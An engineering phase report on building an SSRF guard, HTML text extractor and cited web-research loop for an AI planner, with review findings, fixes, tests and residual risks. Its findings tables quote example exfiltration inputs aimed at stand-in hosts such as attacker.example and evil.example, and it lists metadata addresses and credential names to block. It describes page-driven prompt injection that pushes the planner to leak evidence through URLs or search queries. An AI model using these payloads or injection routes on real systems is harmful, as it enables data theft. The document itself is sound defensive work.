# PROJECTOS-PORT-RESEARCH1A — cited research: SSRF guard, readable text and a step-capped search loop (C16)

**Phase:** PROJECTOS-PORT-RESEARCH1A, phase 11 of `docs/changes/delta_spec_V4_PORTS.md`, plan v1.36 (active), delta row 5.
**Branch:** `projectos-port-research1a`, worktree `C:/dev/ProjectOS-worktrees/port-research1a-v136`, based on the reviewed
providers branch plus the shared credit-directory commits. Not pushed, not merged, phase not closed, no phase record created.
**State:** built, review round 1 fixed, and the FINAL fix round (review round 2) made (below). ECC SECURITY found no CRITICAL or HIGH, 4 MEDIUM and 4 LOW;
the Agency application-security review blocked wiring until F1 and F2 were decided. All of them are addressed here. The recheck found M3 partial, M4 not fixed and two residual channels of R1; those are fixed in
the final round, and no further review follows it: the lead re-runs everything and reproduces each input. `docs/06_Plan.md` is not edited. Full `validate-all` is the lead's and was not run here. Nothing was run from a vendor
folder, `openbot-lower` was not opened, and no `DO-NOT-PORT.txt` was read.

## Existing code found (B1, before any code)

| Found | Where | What was done |
|---|---|---|
| `admitSearchResult`, `admitCitedAnswer`, `citationPathProblem` | `core/src/search/citation.ts` | **Reused unchanged.** A fetched page becomes a `CitedSearchHit` in the run's project, and an answer is admitted by `admitCitedAnswer`. No second citation door |
| `truncateUtf16Safe` | `core/src/search/textBudget.ts` | Reused to cut a page at its cap without splitting a surrogate pair |
| `scanForThreats` | `core/src/memory/threatScan.ts` | Reused, scope `context`, now on pages, titles, addresses, every search result and the evidence header. No second scanner |
| `isTenantId`, `isProjectId`, `sha256Hex` | `core/src/tenant.ts`, `core/src/execution/evidence.ts` | Reused for the scope and for every hash |
| `renderUntrustedExcerpt` | `core/src/search/untrustedExcerpt.ts` | **Not reused.** It fences a document excerpt with a file header. A page needs the ported OpenClaw wrapper (boundary rewriting, special tokens, numbered lines). The search door is reused; its fence is not |
| `isLoopbackHost`, `INTERNAL_SUFFIX`, `isNonPublicLiteral` | `core/src/modelBroker/endpoints.ts` | **Not imported, and the overlap is real.** PP-24 in `val-projectos-port-providers1a` refuses any file outside the broker that names it, so importing it would break that validator on the stack. This guard is stricter (single-label names, IPv6 classes, resolution, IDNA) and its suffix list is its own. Merge later through the broker's barrel if the owner wants one list |
| `CommittedRead`, `loadCommittedBrokerConfig` | `agent/src/modelBroker/committedConfig.ts` | **Shape copied, not imported**, for the same reason. `agent/src/research/committedPolicy.ts` declares the same 4-line type |
| `provenanceProblem` | `core/src/memory/proposal.ts`, `core/src/skills/promotion.ts` | A name collision found by the importer fence in the fix round: this module's function is `urlProvenanceProblem` |
| Any other SSRF, URL or DNS code | grep of `core/src`, `agent/src`, `connectors`, `providers` | None. The only hits outside this module are the broker's endpoint rules above and unrelated sentinel text |
| `agent/src/search` (index, document walk) | — | Nothing to reuse: it is the local index, and this phase searches the web |

## Delivered

| Item | Path | Lines |
|---|---|---|
| Ported, pure (11 files) | `projectos/core/src/research/{addressClass,hostNames,urlParse,ssrfGuard,websitePolicy,externalContent,readableText,extractors,searchRuntime,searxng,brave}.ts` | each under 275 |
| Original, pure (13 files) | `projectos/core/src/research/{refusal,ports,timing,pageCache,webFetch,evidence,searchBudget,searchProvider,resultScreen,urlProvenance,answerFilter,researchLoop,index}.ts` | each under 330 |
| Original, agent (3 files) | `projectos/agent/src/research/{committedPolicy,runtime,index}.ts` | under 90 |
| Barrel | `projectos/core/src/index.ts` | one line, `export * from './research/index.js';` |
| Notices | `THIRD_PARTY_NOTICES` | 12 entries, written by script from each file's own header |
| Tests | `projectos/core/test/research-{url,guard,policy,content,search,loop,fixround,final}.test.ts`, `researchFixtures.ts`, `projectos/agent/test/research.test.ts` | 199 core `it` blocks (19 of them new in the final round), 11 agent |
| Validator | `projectos/validators/val-projectos-port-research1a.cjs` | 41 rules (PR-1 to PR-40 and PR-T), 205 text and 165 behavioural mutations, 87 probes, in both runners |
| Credit list | `projectos/validators/val-projectos-port-credit1a.cjs` | one word, `research`, added to `PORT_VALIDATORS` (see L7) |

27 source files, 3111 lines, none over 330. No new dependency: `package.json` of both packages is pinned by PR-7.

## Ported files and their pin

OpenClaw `c5b56f2505c4f6a5803125d2923e2934c5f750af` (MIT, OpenClaw Foundation), each also carrying `Also-Credits: pi-mono`.
Hermes `d3e586881eacb132595edcbe4c170be8381e40c5` (MIT, Nous Research).

| File | Upstream path | Strategy | What ProjectOS changed (the file's own `CHANGED:` lines have the full text) |
|---|---|---|---|
| `externalContent.ts` | OpenClaw `src/security/external-content.ts` | ADAPT | Web sources only; the boundary id is a hash of what it holds, where upstream drew random bytes; the folded marker scan kept whole; header values lose invisible characters |
| `readableText.ts` | OpenClaw `extensions/web-readability/web-content-extractor.ts` | ADAPT | **Readability and linkedom replaced by a small tag scanner, so no dependency is added.** Size cap and nesting estimator kept; the scan is now linear and budgeted; hidden elements dropped where the markup says so |
| `extractors.ts` | OpenClaw `src/web-fetch/content-extractors.runtime.ts` | ADAPT | Extractors handed in; a failing one is recorded by id, where upstream swallowed it |
| `searchRuntime.ts` | OpenClaw `src/web-search/runtime.ts`; `runtime-error.ts` | ADAPT | Candidate loop kept (named provider never replaced, first failure kept); a paid candidate is gated; results are screened; every call is timed; provider text is never repeated |
| `searxng.ts` | OpenClaw `extensions/searxng/src/searxng-client.ts` | ADAPT | Endpoint declared public or self-hosted, not inferred from DNS; injected fetch; never follows a redirect |
| `brave.ts` | OpenClaw `extensions/brave/src/brave-web-search-provider.runtime.ts` | ADAPT | Web mode only; no credential is read, a header function is handed in; **not enabled without a cross-run ledger port that answers exactly true**; a code outside Brave's lists is refused |
| `addressClass.ts` | Hermes `tools/url_safety.py` | TRANSLATE | Address ranges written out; wrappers read through; **only 2000::/3 is public**; Azure WireServer added to the metadata set; `normalizeAddress` for comparing spellings |
| `hostNames.ts` | Hermes `tools/url_safety.py` | TRANSLATE | Metadata names kept; internal suffixes, wildcard-DNS services and the single-label rule are ours |
| `urlParse.ts` | Hermes `tools/url_safety.py` | TRANSLATE | Onto the WHATWG parser; userinfo, backslash, whitespace, control characters and a percent host refused; a canonical form; a wider credential-name list |
| `ssrfGuard.ts` | Hermes `tools/url_safety.py` | TRANSLATE | Two resolutions both judged; the port is handed only the judged addresses **and must name the one it connected to**; redirects judged each hop; every wait bounded |
| `websitePolicy.ts` | Hermes `tools/website_policy.py` | TRANSLATE | A value, not a config file; **malformed refuses the whole policy where upstream failed open**; an allow-list mode |

Pi / pi-mono: all seven OpenClaw files were searched for `pi-mono`, `mario`, `zechner`, `earendil`, `copyright` and `spdx`: zero
matches, no Pi import. OpenClaw's own notices say portions were adapted from Pi without saying which, so Pi is not ruled out and
every OpenClaw file carries the `Also-Credits` line. Not taken: OpenClaw `src/web-fetch/runtime.ts` (provider and config resolution),
`runtime-types.ts`, the Brave `llm-context` mode, `truncateSanitizedExternalContent`, and Hermes `tools/web_tools*`, `x_search_tool.py`
and `plugins/web/xai` (xAI-backed, refused).

## Review round 1 and the fix round

The failing test came first for every item: `core/test/research-fixround.test.ts` was written against the unchanged code and run
**red, 39 of 43 failing** (the four that passed were regression guards). The reviewer's measured inputs are in it: `'<br '.repeat(250000)`
took **1860 ms** and `'<img "'.repeat(166666)` **2012 ms** against a 200 ms bound. After the fix both finish in about 100 ms and 25 ms.
Each fix has a named validator mutation killed by its own rule; the rule is in the last column.

| # | Finding | Fix | Test | Rule |
|---|---|---|---|---|
| H1 | Exfiltration through a planner-chosen URL: only a fixed list of credential names was blocked, so a page saying "verify at https://attacker.example/c?d=…" or a `<b32>.attacker.example` subdomain carried the evidence out | `urlProvenance.ts`: an address the planner asks for must be, in canonical form, in the question or in this run's screened search results; **an address found only in page text is never fetchable**. Cap `MAX_FETCH_URL_CHARS` 1024 and `MAX_HOSTS_PER_RUN` 4. A policy in **allow-list mode** may also allow an unlisted address on a host it NAMES, exactly (not a subdomain), with no query and no fragment. Reasons are closed codes (`not-listed`, `url-too-long`, `too-many-hosts`) | *H1: …* (7 tests), loop tests | PR-33 |
| H2 | The pinning contract was a comment | `HttpFetchResponse.connectedAddress` is required; the guard refuses (`connected-address-not-pinned`) when it is absent, not an address, or not in the pinned set, compared as `normalizeAddress` spells it (`::ffff:1.1.1.1` equals `1.1.1.1`). Checked on every hop and for a self-hosted endpoint. `ports.ts` states that `maxBytes` applies AFTER decompression and that the guard sets `accept-encoding: identity` itself. **Conformance harness**: the last test of *H2* runs a faithful port, a rebinding resolver, a redirect hop, a lying port and a decompression bomb through the guard | *H2: …* (7 tests) | PR-34, PR-16 |
| M1 | Extractor CPU DoS: `readTag` rescanned up to 4096 characters for every `<` | `createFinder` remembers where the next `>` and quote are, so the page is walked once; `WORK_FACTOR` (4x the page) caps total work. `exceedsEstimatedHtmlNestingDepth` uses the same lookups; once no `>`, comment or declaration is left, the rest of the page is taken as text at once | *M1: …* (5 timing tests plus a correctness test) | PR-35 |
| M2 | Search results and the evidence `URL:` label were untrusted text shown as is | `resultScreen.ts`: a result with **tag characters or bidi controls is dropped**, zero-width characters are stripped, model tokens split by them are replaced, and `scanForThreats` runs on every title, snippet and address; a hit drops the result and records why (index, closed reason, pattern ids). The evidence header strips invisible characters and shows `[removed]` for a value that matches the scan; the page address is scanned too | *M2: …* (5 tests) | PR-36 |
| M3 | A hung planner, provider, resolver or port hung the run; the planner was free; the paid cap had no ceiling | `timing.ts` and `TimerPort`: **every wait goes through an injected timer** with a signal. Named waits (`DEFAULT_TIMEOUTS`: DNS 5 s, fetch 32 s per hop, search 20 s, planner 60 s) that a caller can only lower, and each is also capped by what the run has left, so the deadline holds **mid-step**. A hang ends the run with `TIMEOUT` or `DEADLINE`, and a hung fetch releases its slot. The planner is charged to the spend book by its size (`PlannerPrice`) and asked of the grant before every call. `MAX_RUN_BUDGET_MICRO_USD` (2,000,000, two dollars) is a ceiling no request can exceed. Brave needs a `ledger` port that answers exactly `true` | *M3: …* (8 tests) | PR-37, PR-38 |
| M4 | The 20,000-character answer was unfiltered | `answerFilter.ts`: HTML tags, comments and autolinks are removed, markdown images are removed, markdown links keep their words, and raw addresses with a scheme, `www.`, `javascript:`, `data:` and `vbscript:` text become `[link removed]` unless the address is a cited source, exactly as fetched. `ResearchOutcome.removedFromAnswer` counts them. **The UI rule: the answer is plain text.** It is shown as text, never parsed as markdown or HTML, never auto-linked | *M4: …* (4 tests) | PR-39 |
| L1 | Redirect downgrade; headers forwarded on redirects | https to http is refused (`redirect-downgrade`); the caller's headers go on hop 0 only, every hop carries the guard's own `accept-encoding` | *H2: the guard, not the caller…*, *refuses a redirect from https to http* | PR-34 |
| L2 | `responseProblem` ignored the decoded body length; adapters could parse an oversize body | The UTF-8 length of `body` is checked against `maxBytes` in the guard, so an adapter is refused before `JSON.parse` | *L2: …*, *H2: a decompressed body…* | PR-32 |
| L3 | Classifier and credential list gaps | Azure WireServer `168.63.129.16` joins the metadata set; the other listed ranges were already refused and are now pinned by a test. The credential-query list is case-insensitive and covers `x-api-key`, `x_api_key`, `apikey`, `api-key`, `access_token`, `auth`, `sig`, `signature`, `key`, `secret`, `password`, `token`, `session`. **This reverses an earlier choice:** `?key=` and `?session=` were page facets and are now refused. `code` is still allowed | *L3: …* (2 tests), URL tests | PR-12, PR-14 |
| L4 | The refusal note told the planner which address class or DNS fault it hit | One neutral reason, `not-fetchable`, for every name, address and DNS refusal; the run returns an `audit` list with the exact code and reason for the people who audit it, never to the model | *L4: …* | PR-33 |
| L5 | Cache memory bound | 8 pages x 50,000 characters x 2 bytes x 64 scopes = **51 MB** of text worst case (was 32 x 256, 819 MB). A test pins the product under 64 MB. The slot book holds up to 1,024 scopes and is a few bytes each | *L5: …* | PR-22 |
| L6 | The hidden-text claim | **Stated plainly:** hidden text is dropped only where the page says so in the markup: `hidden`, `aria-hidden`, and an inline style with `display:none`, `visibility:hidden`, `font-size:0`, `opacity:0` or an off-screen position (`left`, `top`, `text-indent` of three digits or more negative). **A style sheet or a class cannot be read, so text hidden that way IS extracted**, and the threat scan is the defence for it | *L6: …* | PR-35 |
| L7 | Credit list | `research` is added to `PORT_VALIDATORS` in `val-projectos-port-credit1a.cjs` (a one-word edit, outside this phase's write paths, approved by the lead). The build-the-marks-from-parts workaround in this phase's validator is removed | credit validator | PR-2 |
| — | No robots.txt handling | Kept as a **named residual**: neither source has any, and a policy invented here would be new behaviour | — | — |

**The cross-run ledger, plainly.** The spend book is per run. What the owner has spent across runs belongs to the grant and to a
ledger that outlives a run, and this phase does not build one. What it does: the Brave adapter refuses to be made without a `ledger`
port, asks it before every query, and sends nothing unless it answers exactly `true`; the planner's price is asked of `grant` before
every call; and a run's budget cannot exceed two dollars whatever its request says. A later phase supplies the ledger.

## Review round 2 and the final fix round

The recheck (a read-only reviewer that reproduced) found H1, H2, M1, M2 and L1 to L7 FIXED, and left M3 partial, M4 not fixed and two
residual channels of R1. The builder of the final round was cut off by a usage limit after a WIP commit (`67d4d527`, unbuilt and
unverified); this round built it, ran its test (18 of 18 green: the WIP was right) and added what was missing. The failing test came
first for every item: `core/test/research-final.test.ts`. Each fix has a named validator mutation (text and behavioural) that is
killed by its own rule; the validator's own output, not this table, is the evidence (`PASS ... 205 text and 165 behavioural mutations killed`,
which is 28 and 26 more than before the round).

| # | Finding | Fix | Test | Rule and mutations (each killed by its own rule) |
|---|---|---|---|---|
| M3 (a) | `granted()` in `searchBudget.ts` was not timed: a hung grant hung `runResearch` forever | The grant is asked through the injected timer (`grantMs`, 5 s, lowered by the run's deadline). A timeout is `TIMEOUT`, which is a refusal; nothing is reserved and the provider or planner is never called | *M3 (a)*: a hung grant for a paid search, for the planner, and a grant that answers, throws or is slow but in time | PR-37: `a-grant-that-is-slow-is-a-refusal-of-another-kind` |
| M3 (b) | A timer answering `{done:true}` with no value made `runResearch` throw a TypeError | `callWithin` takes `done:true` with no `value` for an error; the loop and `searchRuntime` also check the SHAPE of what a call returned (an object with `action` / `answer`); anything else is a refusal (`PLANNER_FAILED`, `SEARCH_FAILED`), never a throw | *M3 (b)*: `{done:true}` and `{done:true,value:5}` for the run and for a search | PR-37: `a-value-less-answer-is-a-value`, `a-planner-answer-shape-is-not-checked`, `a-search-answer-shape-is-not-checked` |
| M3 (c) | The deadline was only checked between steps: one fetch could wait about 160 s (6 hops x 27 s) past a 120 s deadline | `fetchGuarded` has a TOTAL budget over all its hops (`fetchTotalMs`, 60 s by default) read from the injected clock; each wait is the smaller of its own limit and what is left, and a spent total is `TIMEOUT`. The loop gives its fetch the run's remaining time minus `DEADLINE_MARGIN_MS` (1 s). **The lookups are subtracted too** (found while checking the finished work: the WIP gave the port the time left BEFORE the lookups): the two DNS waits of a hop get half of what is left each, and what is left is read AGAIN before the port is called | *M3 (c)*: a fake timer and a virtual clock, 5 s per hop; a run with a 12 s deadline; slow lookups (new); an ordinary redirect still followed | PR-37: `the-total-fetch-budget-goes`, `a-hop-ignores-the-total`, `a-lookup-ignores-the-total`, `the-loop-gives-the-fetch-the-whole-deadline`, `the-lookups-are-not-subtracted`, `the-two-lookups-each-get-the-whole-total`, `the-port-is-called-with-no-time-left` |
| M4 | The answer filter passed `![x][1]\n[1]: //evil.example/a?d=S`, `[1]: https&#58;//evil.example/?d=S`, `<<b>img src=//evil.example/?d=S>` and a bare `evil.example/x?d=S`; it also damaged `Map<String, Integer>` and `Input data: 5` | `answerFilter.ts` now **decodes entities first** (named, decimal, hexadecimal, and again per layer), **runs to a fixpoint** (`MAX_FILTER_PASSES` 8; text still changing at the cap is NOT returned: `stable:false`, and `runResearch` refuses the answer and tells the planner `answer-unfilterable`), removes reference definitions and reference-style images and links, scheme-relative `//host.tld/...`, bare `host.tld/path?...` (kept only when it is a cited source's own address), and `javascript:` / `data:` / `vbscript:` followed by a letter or a slash; HTML is removed by an **allow-list of real tag names**, so a type argument and an inequality stay. Every pattern is bounded | *M4*: the reviewer's inputs and 9 more, a nesting depth of 12 refused as unstable, 13 harmless texts left byte for byte, a cited source kept, hostile input under 1.5 s, the loop's refusal | PR-39: `one-pass-is-enough`, `entities-are-not-decoded-first`, `reference-definitions-stay`, `reference-links-stay`, `scheme-relative-addresses-stay`, `bare-addresses-stay`, `script-schemes-stay`, `every-angle-bracket-name-is-a-tag`, `a-type-argument-is-a-tag`, `an-unstable-answer-is-returned` |
| R1 (a) | In allow-list mode any path on a named host passed | An unlisted address on a named host is refused (`not-listed`) when its path is longer than `MAX_ALLOW_LIST_PATH_CHARS` (64), as well as when it has a query or a fragment; a long path the run listed verbatim is still fetchable | *R1 (a)*: a long path refused, a short one fetched, a listed long one fetched | PR-33: `a-long-allow-list-path-is-fetched` |
| R1 (b) | The planner-chosen SEARCH QUERY was an outbound string with no gate | `queryProvenanceProblem`: refused when longer than `MAX_PLANNER_QUERY_CHARS` (200), when it holds an address (scheme, `www.`, a bare `host.tld/...`, an `@`), when it holds a run of `MIN_ENCODED_RUN_CHARS` (32) or more base64, hex or base32 characters, or when it quotes `MAX_QUERY_QUOTE_CHARS` (40) or more characters of a page the run fetched (case and white space folded). The **audit list** gets the precise reason (`query-too-long`, `query-has-address`, `query-has-encoded-data`, `query-quotes-a-page`); the **planner** is told only `search refused: QUERY_REFUSED/not-sendable`. A refused query reaches no provider and is charged nothing | *R1 (b)*: eight attempts with their exact audit reasons and the one neutral note; ordinary queries and a short quote pass | PR-40 (new): `a-long-search-query-is-sent`, `an-address-in-a-query-is-sent`, `encoded-data-in-a-query-is-sent`, `a-page-quote-in-a-query-is-sent`, `the-query-gate-is-skipped`, `the-planner-is-told-the-exact-query-reason` |

One existing mutation, `a-name-is-resolved-once` (PR-16), now also fires PR-37, because the new lookup probe counts the two lookups; it
says so (`also`), as the neighbouring mutations do.

**Named residuals the lead asked to keep, not fixed here:** the threat scan dropping a legitimate result (a title that says "system
prompt override"); the host cap counting a failed fetch (the safe side); percent-encoded instructions in the query of a kept URL.

**What the answer filter is, and is not.** It is DEFENCE IN DEPTH and it is **not sufficient on its own.** The UI must render a research
answer as PLAIN TEXT: shown as text, never parsed as markdown or HTML, never turned into a link, never allowed to load an image, a
frame or a style. No filter can be proved to recognise every spelling of an address. This is stated in the module header and again
under the residuals. One visible change: entities are decoded, so `&amp;` is shown as `&`.

## What is refused, and with what code

Every refusal is a closed code, and a URL refusal also carries a closed reason. A refusal never carries page text, a URL's userinfo or
its query: `core/test/research-guard.test.ts` pins that `hunter2` and `?token=abc` do not appear in one.

- **Addresses, in every spelling.** Loopback, private (10/8, 172.16/12, 192.168/16), link-local, CGNAT, unspecified, multicast,
  reserved, benchmark, documentation, and the metadata endpoints (`169.254.169.254`, `169.254.170.2`, `169.254.169.253`,
  `100.100.100.200`, `168.63.129.16`, `fd00:ec2::254`) named as `metadata-address`, also when wrapped as `::ffff:a.b.c.d`,
  `::ffff:0:a.b.c.d` or `::a.b.c.d`. Decimal, octal, hex, shorthand, full-width and ideographic-dot spellings are one dotted address by
  the time the guard sees them. IPv6 outside 2000::/3, NAT64, 6to4 and Teredo are refused.
- **Names.** `localhost` and `.localhost`, `.local`, `.internal`, `.localdomain`, `.lan`, `.home.arpa`, `.intranet`, `.corp`, `.home`,
  reverse zones, metadata host names, wildcard-DNS services (`nip.io`, `sslip.io`, `xip.io`, `lvh.me`, `localtest.me`, `vcap.me`,
  `lacolhost.com`, `traefik.me`), single-label names, empty labels, trailing dots (all dropped), names ending in digits.
- **URLs.** Non-http(s) schemes, `http:/host`, userinfo (any spelling), backslash, whitespace, control characters, a percent sign in
  the authority, credential-named query parameters (the wider list above), a port outside 80/443/8080/8443 (a deliberate narrowing for
  pages), an address longer than 1,024 characters, and **any address the run did not list**. A raw space in a `Location` is refused. A
  non-ASCII `Location` is NOT refused: the URL parser percent-encodes or punycodes it, and the result is judged like any address.
- **Resolution.** A resolver that fails, answers empty, answers more than 16, answers a non-string, answers an unparseable address, whose
  second answer is non-public (`dns-rebind`), or does not answer in time.
- **Redirects.** Judged again at every hop with the same rules; relative targets resolved against the hop; a cap of 5 that a caller
  cannot raise; a redirect with no usable Location refused; https to http refused; an API endpoint never follows one.
- **The fetch port's answer.** Status, headers, body, `bytesRead` within the cap, the body's UTF-8 length within the cap, a boolean
  `truncated`, and a `connectedAddress` that was pinned, or `FETCH_FAILED` / `URL_REFUSED`.
- **Pages.** Status outside 2xx, a content type off the list (or missing), a cut or over-long body (**before** any parsing), no
  readable text, and a threat-scan hit or an oversize page (refused, never passed unread).
- **Money.** A paid search without a budget (`BUDGET_REQUIRED`), without a grant that answers exactly `true` (`NO_GRANT`, and a grant
  that throws is not a grant), or past the room that is left (`OVER_BUDGET`), all before the provider is called; the same for a priced
  planner; Brave without a ledger.
- **Search queries.** Over 200 characters, with an address or an `@`, with a long encoded run, or quoting a fetched page (`QUERY_REFUSED`; exact reason in the audit, `not-sendable` to the planner).
- **Time.** A spend grant, a resolver, a port, a provider or a planner that does not answer in time (`TIMEOUT`); all the hops of one fetch together past `fetchTotalMs`; a timer or a call that answers with the wrong shape is a refusal, never a throw.
- **Answers.** No citation, a citation of a page that was not fetched, of lines it does not have, or an answer that is malformed.
  The citation's project is the run's, whatever the planner wrote. An answer the filter cannot make stable is refused (`answer-unfilterable`).

## Acceptance criteria to evidence

| Criterion | Evidence |
|---|---|
| Loopback, link-local, private, metadata and non-http(s) refused, including after a redirect and via the injected resolver | `research-guard.test.ts` and `research-url.test.ts`; `research-fixround.test.ts` for the connected-address check and the conformance run. PR-12 to PR-16, PR-34 |
| A research loop stops at its step cap and refuses to answer without a citation | `research-loop.test.ts`: *stops at the step cap and says so*, *never answers without a citation, however many steps it is given*, *refuses a citation of a page that was not fetched…*. PR-24, PR-25 |
| Fetched content is fenced as untrusted, and a threat-scan hit is refused before a prompt | `research-content.test.ts` and `research-loop.test.ts`; for search results `research-fixround.test.ts` *M2*. PR-18, PR-19, PR-36 |
| A paid search provider call without a budget is refused | `research-search.test.ts`, `research-loop.test.ts`, and *M3* for the planner and the ceiling. PR-9, PR-10, PR-11, PR-38 |
| Credit header and notices entry on every ported file; credit validator passes | 11 ported files, 12 entries; `val-projectos-port-credit1a` PASS. PR-2, PR-3, PR-4 |
| The validator refuses any importer outside the module | PR-30: the tracked-file scan allows exactly the core barrel line. `an-importer-appears` is killed |
| Validator pin and named mutations, each killed by its own rule | 205 text and 165 behavioural mutations, below |

## The validator and its mutations

`val-projectos-port-research1a.cjs`: 41 rules (PR-1 to PR-40 and PR-T), 87 behavioural probes, 210 pinned test names. Every pin is
taken from inside the function that decides, after comments are stripped. The code also runs: `behaviour` copies this phase's
TypeScript and the kernel files it imports into a scratch directory, and Node's type stripping runs it against fakes. The unmutated copy
must pass every probe, and a mutation counts only when exactly the rules it names fail. Seven rules are new in the fix round
(PR-33 to PR-39), with 8/8, 6/6, 6/3, 8/8, 9/8, 7/8 and 6/6 text and behavioural mutations. A two-part mutation edits its second part on
top of the first. Mutations that legitimately break a neighbour's probe say so (`also`), for example the reservation, the role token,
and the cache read. A behavioural mutation that makes **every** fetch fail (the port given nothing to dial) was removed, because with
the connected-address check it can no longer be told apart by rule; its text mutation stays.

```text
val-projectos-port-research1a: PASS (27 real files judged; 205 text and 165 behavioural mutations killed)
val-projectos-port-credit1a: PASS (103 real file(s) judged; 157 fixture and 59 record mutations killed)
```

## Checks run, with what was seen

| Check | Result |
|---|---|
| `core`: `npx vitest run` | exit 0, 72 files, **3196 tests passed** (final round, after the last source edit), of which 199 are this phase's |
| `core`: `npm run -s build` | exit 0 (repeated after the last source edit) |
| `core`: `tsc -p tsconfig.json --noEmit` | exit 0 with `strict`, `noUncheckedIndexedAccess` and `exactOptionalPropertyTypes` (final round) |
| `agent`: tests | `agent/test/research.test.ts`, **11 of 11 passed, through an ALIAS config** (below). A whole-directory agent run was also made once: 3436 passed, 10 skipped, 1 file failed, `test/tenantSidecar.test.ts` at its 170 s timeout while 12 validators ran in parallel; it does not touch this module and was not re-run in isolation |
| `agent`: typecheck | `tsc` over `agent/src` and `agent/test` through an alias `tsconfig` (`paths` for `@projectos/core` to this worktree's `core/dist/index.d.ts`), exit 0 |
| `val-projectos-port-research1a` | PASS, 205 text and 165 behavioural mutations killed, each by its own rule (read from the validator's output; it fails when one survives or fires a rule it did not name) |
| `val-projectos-port-credit1a` | PASS, above |
| `validate-no-secrets` | PASS |
| Every validator that reads a touched file | A search of `projectos/validators` and `projectos/speed` for the touched paths finds only this phase's validator, the credit validator and the two registration files, and the validators that walk `core/src` were run as well: cd-b4-repository-baseline-adapter1a, agent-workforce1a, host-review-path1a, live-gate-owner-floor1a, port-approvals1a (83 scenarios), port-providers1a (221+89), port-search1a (113+25), technical-continuation1a, tenant-csp1a (106), worker-lifecycle-bounded1a, watchdog-core1a and validate-zero-relay-continuity, plus `val-projectos-port-credit1a` (PASS) and `validate-no-secrets` (PASS). Each in its own process, **all exit 0, and run AFTER the last source edit**. The earlier 29-validator run of round 1 was not repeated in full |

**Running the agent test.** `agent/node_modules/@projectos/core` is a junction to another worktree, so plain `npx vitest` cannot see
this phase's core. The test and the typecheck ran with scratchpad configs aliasing `@projectos/core` to this worktree's
`projectos/core/dist/index.js` and `index.d.ts` (after `npm run build` in core):

```js
export default {
  root: 'C:/dev/ProjectOS-worktrees/port-research1a-v136/projectos/agent',
  resolve: { alias: { '@projectos/core': 'C:/dev/ProjectOS-worktrees/port-research1a-v136/projectos/core/dist/index.js' } },
  test: { include: ['test/research.test.ts'], setupFiles: ['test/setup.ts'] },
};
```

**Test-first in the first build was not strict, and this says so.** The first build's pure modules and tests were written together; its
first runs had 10 failing core tests and 1 agent test, one of them a real code bug (blank lines between paragraphs). The fix round was
strict: the new tests ran red first (39 of 43), then the code.

## Findings worth knowing

- **The write tool decoded `\uXXXX` escapes into raw control characters** in a regex in `urlParse.ts`; it is `\x00-\x20\x7f-\x9f` now, and
  new text that needs those ranges (`resultScreen.ts`) builds them from code points. Every file of the module was scanned: ASCII only.
- **Two defences for one rule hide each other from a mutation.** Userinfo, the cache scope, the markdown image and link filters, and the
  autolink and tag filters each have a second layer. A test that deleted one still passed, so a mutation deletes both, or a probe asserts
  the exact output of a single construct.
- **A work budget caught its own regression.** With the finder's memory removed, the budget trips on an ordinary page and extraction
  returns nothing, so the mutation is killed by three other rules as well, and says so.
- **A name collision.** `provenanceProblem` already exists in memory and skills; the importer fence found it. Renamed.
- **The Windows Git Bash hook blocks any command containing `..` or `//`.** Not a code issue; it shaped how the checks were run.

## Converge (B9)

| Delta row 5 asks for | State |
|---|---|
| SSRF guard and website policy | `addressClass`, `hostNames`, `urlParse`, `ssrfGuard`, `websitePolicy`: fail-closed, with the connected address checked, an allow-list mode and every wait bounded |
| Readability extraction | A small in-repo tag scanner, **not** Mozilla Readability, now linear. A better extractor is one injected `WebContentExtractor` away |
| Step-capped research loop, cited answers only, reusing `admitCitedAnswer` | `researchLoop.ts`; fetches held to the run's own addresses; the search query gated; every wait bounded, including the grant and all the hops of a fetch together; the answer filtered to a fixpoint, and an unstable answer refused |
| Fetched content untrusted and threat-scanned with the memory scan | Pages, titles, addresses, every search result and the evidence header |
| SearXNG and Brave behind an injected fetch, fakes only | `searxng.ts`, `brave.ts`; no live call in any test |
| Paid search counts against the budget (P3) | `searchBudget.ts`: budget, grant, room, reserved before the call; the planner is charged too; a hard ceiling; Brave needs a ledger |
| Unwired | PR-30; the only importer is the core barrel line, the stated exception |
| No xAI or Grok path | PR-8 |

**PROTECTED, untouched:** every file in `docs/00_Baseline_State.md` §4 and the delta. The only edits outside this phase's own
directories are the barrel line, `THIRD_PARTY_NOTICES` entries, the two validator-registration lines (before the connector-contract
entry, same place and order in `validate-all.cjs` and `speed/cached-runner.cjs`), and the one word in the credit validator's list.

**Not done, and why:** no robots.txt handling (above); no cross-run ledger and no reconciliation with what a provider billed (a later
phase); no live port.

## Residual risks and limits (read these before relying on it)

- **The fetch port's contract is still the real SSRF boundary, now checked after the fact.** The guard judges addresses, hands the port
  only those, and refuses a response whose `connectedAddress` was not pinned. That catches a port that dials somewhere else, but only
  after the request was sent, and only if the port reports honestly. A port that lies about `connectedAddress` defeats it. The wiring
  phase's reviewer must run the conformance harness against the real port and read its dial code.
- **Resolving twice is a tripwire, not a proof.** A rebinding attacker can answer public twice. Pinning, and now the connected-address
  check, are what hold.
- **A threat scan lists patterns.** A clean page or result means no listed pattern matched. Content is fenced after it passes, and a fence
  does not make a model obey. What protects ProjectOS is that a model's output reaches nothing without the kernel's gates.
- **The scan refuses legitimate pages** about security, by design, and refuses a page whose sanitized text exceeds 65,536 characters.
- **A search provider is trusted to list real addresses.** Whatever it lists is fetchable. The host cap (4) and the screening bound what one
  run can reach; a hostile provider can still steer a run to a host of its choice, once screened.
- **Allow-list mode is only as good as the list.** A named host is allowed exactly, with no query; a subdomain is not.
- **Hidden text styled by a style sheet or a class is extracted** (L6 above).
- **The answer filter is DEFENCE IN DEPTH and is not sufficient on its own.** It decodes entities, runs to a fixpoint, removes reference definitions, scheme-relative and bare addresses and script schemes, and refuses text it cannot make stable, but no filter can be proved to recognise every spelling. **The UI must render a research answer as PLAIN TEXT**: never parsed as markdown or HTML, never linked, never allowed to load an image, a frame or a style. A client that renders markdown is exposed to whatever the filter misses.
- **Final-round residuals, kept on purpose.** The threat scan drops a legitimate result whose title says, for example, "system prompt override". The host cap counts a failed fetch (the safe side). Percent-encoded instructions in the query of a kept URL are not decoded.
- **The search-query gate is a heuristic.** A planner can still send a question that is itself a message (a few short words chosen to carry a secret, spread over several queries): the caps (200 characters, 40-character quote, 32-character encoded run, no address, no `@`) bound what one query carries, and the run is step-capped, but a determined planner with a conspiring provider is not ruled out. Every refused query is in the audit list with its exact reason.
- **An allow-list host still sees up to 64 characters of path** on an address the run did not list, and the path of a listed one in full.
